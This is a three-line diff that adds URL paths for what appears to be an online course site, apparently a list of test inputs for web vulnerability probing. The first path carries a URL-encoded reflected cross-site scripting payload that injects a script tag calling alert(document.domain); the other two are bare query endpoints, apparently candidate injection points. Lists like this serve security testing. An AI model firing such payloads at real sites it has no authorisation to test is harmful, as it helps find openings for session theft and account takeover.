@@ -1,0 +1,3 @@
+/search?query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/home/courses?query=
+/academy/tutor/filter?searched_word=acoa5\
